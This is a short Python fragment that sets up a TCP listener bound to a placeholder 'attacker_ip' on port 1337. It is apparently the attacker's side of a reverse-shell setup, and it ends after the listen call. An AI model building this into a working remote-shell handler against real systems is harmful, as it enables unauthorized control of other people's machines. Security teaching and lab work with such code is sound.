import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()
